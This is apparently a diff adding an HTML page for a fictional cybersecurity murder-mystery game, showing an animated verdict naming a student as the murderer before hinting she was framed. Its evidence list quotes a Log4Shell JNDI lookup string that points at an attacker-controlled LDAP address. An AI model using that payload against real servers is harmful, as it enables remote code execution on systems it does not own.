@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CASE CONCLUSION - ANANYA SINGH</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+        }
+
+        .analysis-screen {
+            padding: 60px 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .fade-in {
+            animation: fadeIn 2s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .progress-bar-final {
+            width: 100%;
+            height: 40px;
+            background: #1a1a1a;
+            border: 2px solid #0ff;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill-final {
+            height: 100%;
+            background: linear-gradient(90deg, #0ff, #00ffff);
+            width: 0%;
+            animation: fillToComplete 4s forwards;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #000;
+        }
+
+        @keyframes fillToComplete {
+            to { width: 100%; }
+        }
+
+        .evidence-compilation {
+            background: linear-gradient(135deg, #0a1a1a, #0a0a0a);
+            border: 3px solid #0ff;
+            padding: 40px;
+            margin: 30px 0;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.3);
+        }
+
+        .evidence-item {
+            background: rgba(0, 255, 255, 0.05);
+            border-left: 4px solid #0ff;
+            padding: 20px;
+            margin: 20px 0;
+            opacity: 0;
+            animation: slideIn 0.5s forwards;
+        }
+
+        .evidence-item:nth-child(1) { animation-delay: 0.5s; }
+        .evidence-item:nth-child(2) { animation-delay: 1s; }
+        .evidence-item:nth-child(3) { animation-delay: 1.5s; }
+        .evidence-item:nth-child(4) { animation-delay: 2s; }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .processing {
+            text-align: center;
+            padding: 60px;
+            font-size: 24px;
+            color: #0ff;
+            opacity: 0;
+            animation: fadeIn 1s 2.5s forwards;
+        }
+
+        .dots {
+            display: inline-block;
+        }
+
+        .dots span {
+            animation: blink 1.4s infinite;
+        }
+
+        .dots span:nth-child(2) { animation-delay: 0.2s; }
+        .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+
+        .verdict-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 40px 20px;
+        }
+
+        .verdict-box {
+            text-align: center;
+            max-width: 900px;
+            width: 100%;
+        }
+
+        .murderer-text {
+            font-size: 100px;
+            color: #ff0000;
+            font-weight: bold;
+            letter-spacing: 20px;
+            text-shadow: 0 0 40px rgba(255, 0, 0, 0.8);
+            animation: glitch 0.5s infinite, pulse-red 2s infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes pulse-red {
+            0%, 100% {
+                text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
+            }
+            50% {
+                text-shadow: 0 0 60px rgba(255, 0, 0, 1), 0 0 80px rgba(255, 0, 0, 0.6);
+            }
+        }
+
+        .suspect-photo {
+            width: 350px;
+            height: 350px;
+            margin: 40px auto;
+            border: 5px solid #ff0000;
+            background: #1a0000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 80px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            animation: photo-reveal 1s;
+        }
+
+        @keyframes photo-reveal {
+            from {
+                transform: scale(0);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .case-closed {
+            font-size: 32px;
+            color: #ff4444;
+            margin-top: 40px;
+            letter-spacing: 10px;
+            animation: fadeIn 1s 2s forwards;
+            opacity: 0;
+        }
+
+        .final-summary {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            padding: 30px;
+            margin-top: 40px;
+            text-align: left;
+            animation: fadeIn 1s 3s forwards;
+            opacity: 0;
+        }
+
+        @media (max-width: 768px) {
+            .murderer-text {
+                font-size: 60px;
+                letter-spacing: 10px;
+            }
+            .suspect-photo {
+                width: 250px;
+                height: 250px;
+                font-size: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="analysis-screen fade-in" id="analysisScreen">
+        <h1 style="text-align: center; color: #0ff; font-size: 36px; margin-bottom: 40px;">
+            FORENSIC ANALYSIS COMPLETE
+        </h1>
+
+        <div class="progress-bar-final">
+            <div class="progress-fill-final">COMPILING EVIDENCE...</div>
+        </div>
+
+        <div class="evidence-compilation">
+            <h2 style="color: #0ff; margin-bottom: 30px; text-align: center;">
+                EVIDENCE SUMMARY
+            </h2>
+
+            <div class="evidence-item">
+                <strong style="color: #0ff; font-size: 18px;">✓ NETWORK FORENSICS</strong>
+                <p style="color: #ccc; margin-top: 10px; line-height: 1.8;">
+                    • Attacker IP identified: 192.168.1.89 (Ananya Singh)<br>
+                    • ARP spoofing detected at 01:01 AM<br>
+                    • Man-in-the-Middle attack active from 01:05-01:18 AM<br>
+                    • Data exfiltration: 2.4MB at 01:09 AM<br>
+                    • WhatsApp API bulk deletion at 01:18 AM<br>
+                    • Device: Kali Linux penetration testing laptop
+                </p>
+            </div>
+
+            <div class="evidence-item">
+                <strong style="color: #0ff; font-size: 18px;">✓ MESSAGE RECOVERY</strong>
+                <p style="color: #ccc; margin-top: 10px; line-height: 1.8;">
+                    • Deleted conversation recovered from SQLite shadow table<br>
+                    • Ananya confessed to accessing competition questions<br>
+                    • Message: "You don't understand! The scholarship committee is reviewing applications tomorrow. If this gets out, I lose everything."<br>
+                    • Begged Dr. Goyal to delete server logs (he refused)<br>
+                    • Messages deleted 11 minutes after his death
+                </p>
+            </div>
+
+            <div class="evidence-item">
+                <strong style="color: #0ff; font-size: 18px;">✓ EXPLOIT ANALYSIS</strong>
+                <p style="color: #ccc; margin-top: 10px; line-height: 1.8;">
+                    • Used Log4Shell (CVE-2021-44228) to breach competition server<br>
+                    • Payload: ${jndi:ldap://192.168.1.89:1389/Exploit}<br>
+                    • Remote code execution achieved on Jan 7 at 14:24<br>
+                    • Downloaded cyber_competition_2026.pdf (test questions)<br>
+                    • Won competition using stolen information<br>
+                    • Scholarship application based on fraudulent achievement
+                </p>
+            </div>
+
+            <div class="evidence-item">
+                <strong style="color: #0ff; font-size: 18px;">✓ TECHNICAL CAPABILITY</strong>
+                <p style="color: #ccc; margin-top: 10px; line-height: 1.8;">
+                    • Position: Cybersecurity Club President<br>
+                    • Advanced penetration testing knowledge<br>
+                    • Kali Linux expertise (specialized hacking OS)<br>
+                    • Demonstrated ability in MITM attacks, SQL forensics, exploit development<br>
+                    • Too skilled to leave obvious traces - evidence was staged perfectly
+                </p>
+            </div>
+        </div>
+
+        <div class="processing" id="processing">
+            CROSS-REFERENCING PATTERNS<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
+    </div>
+
+    <div class="verdict-container" id="verdictContainer">
+        <div class="verdict-box">
+            <div class="murderer-text">MURDERER</div>
+            
+            <div class="suspect-photo">
+                <img src="assets/ananya-photo.jpg" alt="Ananya Singh" style="width: 100%; height: 100%; object-fit: cover;">
+            </div>
+
+            <h2 style="color: #ff0000; font-size: 48px; margin: 20px 0;">
+                ANANYA SINGH
+            </h2>
+
+            <div class="case-closed">
+                CASE CLOSED
+            </div>
+
+            <div class="final-summary">
+                <h3 style="color: #ff4444; margin-bottom: 20px;">CONVICTION SUMMARY</h3>
+                <p style="color: #ccc; line-height: 2; font-size: 14px;">
+                    <strong>SUSPECT:</strong> Ananya Singh, Cybersecurity Club President<br>
+                    <strong>CHARGE:</strong> First-degree murder<br>
+                    <strong>METHOD:</strong> Poisoning + Digital cover-up<br>
+                    <strong>MOTIVE:</strong> Preventing exposure of scholarship fraud<br><br>
+                    
+                    <strong style="color: #ff4444;">CRIMINAL TIMELINE:</strong><br>
+                    • Jan 7, 14:24 - Exploited Log4Shell to steal competition questions<br>
+                    • Jan 10 - Won competition using stolen knowledge<br>
+                    • Jan 10, 01:03 - Dr. Goyal confronted her about server logs<br>
+                    • Jan 10, 01:05 - She begged him to delete evidence (refused)<br>
+                    • Jan 10, 01:07 - Dr. Goyal dies (poison administered)<br>
+                    • Jan 10, 01:09 - Exfiltrated his chat history via MITM attack<br>
+                    • Jan 10, 01:18 - Bulk-deleted incriminating messages<br><br>
+                    
+                    <strong style="color: #ffaa00;">KEY EVIDENCE:</strong><br>
+                    • IP 192.168.1.89 present in all attack vectors<br>
+                    • Technical capability to execute sophisticated cover-up<br>
+                    • Motive: Scholarship fraud exposure = career destruction<br>
+                    • Opportunity: Campus network access + advanced skills<br>
+                    • Consciousness of guilt: Immediate evidence destruction<br><br>
+                    
+                    All forensic evidence points to a premeditated murder executed by someone with 
+                    exceptional technical capability. The digital cleanup was professional, calculated, 
+                    and precisely timed. Only someone with her skill set could have orchestrated this.
+                </p>
+            </div>
+
+            <div style="margin-top: 60px; padding: 30px; background: rgba(0, 0, 0, 0.8); border: 2px dashed #666; max-width: 700px; margin-left: auto; margin-right: auto;">
+                <p style="color: #666; line-height: 2; font-size: 13px; text-align: center;">
+                    <em>Or is it?</em><br><br>
+                    
+                    You traced the packets.<br>
+                    You recovered the messages.<br>
+                    You identified the exploit.<br><br>
+                    
+                    Every piece of evidence pointed to Ananya.<br>
+                    <span style="color: #ff4444;">Too perfectly.</span><br><br>
+                    
+                    <span style="color: #888; font-size: 11px;">
+                    "Funny thing about cybersecurity — everyone assumes the expert did it."<br>
+                    - Ananya Singh, Interview Transcript<br><br>
+                    
+                    She told you herself:<br>
+                    "I could've. Which is exactly why I wouldn't."<br><br>
+                    
+                    Dr. Goyal's riddle wasn't about ENCRYPTION vs HABIT.<br>
+                    It was about human predictability.<br><br>
+                    
+                    You chose ENCRYPTION - the technical answer.<br>
+                    But the weakness wasn't in the tech.<br>
+                    <strong>It was in the habit of reusing passwords.</strong><br><br>
+                    
+                    <span style="color: #ff4444; font-size: 12px;">
+                    Someone who understood investigators.<br>
+                    Someone who knew you'd follow the most obvious technical trail.<br>
+                    Someone who could fake all of this.<br><br>
+                    
+                    Ananya said it herself: "Look for someone who thought deleting logs was enough."<br><br>
+                    
+                    She's a cybersecurity expert.<br>
+                    She wouldn't leave such an obvious digital footprint.<br>
+                    Unless someone wanted you to find it.
+                    </span>
+                    </span>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            const processing = document.getElementById('processing');
+            if (processing) {
+                processing.innerHTML = 'ANALYZING DIGITAL SIGNATURES<span class="dots"><span>.</span><span>.</span><span>.</span></span>';
+            }
+        }, 3000);
+
+        setTimeout(() => {
+            const processing = document.getElementById('processing');
+            if (processing) {
+                processing.innerHTML = 'SUSPECT IDENTIFIED<span class="dots"><span>.</span><span>.</span><span>.</span></span>';
+            }
+        }, 5000);
+
+        setTimeout(() => {
+            const analysisScreen = document.getElementById('analysisScreen');
+            const verdictContainer = document.getElementById('verdictContainer');
+            if (analysisScreen && verdictContainer) {
+                analysisScreen.style.display = 'none';
+                verdictContainer.style.display = 'flex';
+            }
+        }, 7000);
+
+        setInterval(() => {
+            const murdererText = document.querySelector('.murderer-text');
+            if (murdererText) {
+                murdererText.style.color = '#fff';
+                setTimeout(() => {
+                    murdererText.style.color = '#ff0000';
+                }, 50);
+            }
+        }, 4000);
+    </script>
+</body>
+</html>
